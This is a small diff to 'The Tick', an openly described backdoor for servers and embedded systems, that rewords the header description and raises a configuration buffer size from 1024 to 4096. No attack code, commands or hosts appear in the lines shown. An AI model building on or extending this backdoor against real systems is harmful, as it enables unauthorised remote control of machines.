@@ -1,5 +1,5 @@
 /*
- * The Tick, a Linux embedded backdoor.
+ * The Tick, a simple backdoor for servers and embedded systems.
  * 
  * Developed by Mario Vilas, mvilas@gmail.com
  * http://www.github.com/MarioVilas/thetick
@@ -21,7 +21,7 @@
 // This is especially important on embedded systems.
 // Do not let it exceed one memory page or it may cause stack overrun problems.
 #ifndef TICK_CONFIG_BUFFER_SIZE
-#define TICK_CONFIG_BUFFER_SIZE 1024
+#define TICK_CONFIG_BUFFER_SIZE 4096
 #endif
 
 // Base command IDs per category.
